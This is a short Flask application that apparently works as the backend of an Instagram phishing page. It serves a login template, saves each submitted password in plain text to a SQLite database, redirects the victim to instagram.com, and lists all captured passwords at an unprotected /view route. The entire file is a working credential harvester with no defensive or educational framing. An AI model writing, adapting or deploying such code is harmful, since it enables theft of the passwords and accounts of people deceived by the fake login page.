from flask import Flask, request, redirect, render_template
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///login.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# -------- Database Model --------
class Login(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    password = db.Column(db.String(200), nullable=False)


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        password = request.form.get("password")

        # Save directly (no encryption)
        new_entry = Login(password=password)
        db.session.add(new_entry)
        db.session.commit()

        return redirect("https://instagram.com")

    # Serve login.html from same folder
    return  render_template("login.html")

@app.route("/view")
def view():
    data = Login.query.all()
    
    if not data:
        return "No data found in database."

    output = ""
    for row in data:
        output += f"ID: {row.id} | Password: {row.password}<br>"

    return output
   

with app.app_context():
    db.create_all()

if __name__ == "__main__":
    app.run(debug=True)


